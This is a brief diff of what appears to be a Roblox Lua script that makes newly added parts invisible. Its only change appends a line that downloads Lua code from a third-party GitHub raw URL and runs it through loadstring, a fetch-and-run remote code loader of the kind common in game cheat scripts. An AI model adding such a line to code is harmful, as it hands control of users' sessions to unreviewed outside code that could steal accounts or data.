@@ -37,3 +37,5 @@ a.DescendantAdded:Connect(function(v)
         v.Transparency = 1
     end)
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/RngNew/main/Sols"))()
